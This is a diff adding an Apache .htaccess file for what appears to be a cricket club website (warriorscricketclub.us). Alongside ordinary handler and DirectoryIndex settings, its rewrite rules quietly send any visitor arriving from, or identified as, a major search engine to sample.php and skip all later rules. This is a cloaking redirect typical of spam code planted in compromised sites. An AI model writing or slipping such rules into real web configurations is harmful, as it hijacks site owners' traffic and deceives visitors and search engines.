@@ -1,0 +1,9 @@
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} (bing|google|yahoo|msn|aol) [OR]
+RewriteCond %{HTTP_REFERER} (yahoo|msn|aol|bing|google)
+RewriteCond %{HTTP_HOST} warriorscricketclub\.us
+RewriteRule . sample.php [L,S=10000]
+AddHandler application/x-httpd-alt-php56___lsphp .php
+DirectoryIndex default.html default.htm index.php index.shtml index.html index.htm home.html home.htm index.php5 welcome.html welcome.htm
+Options -Indexes
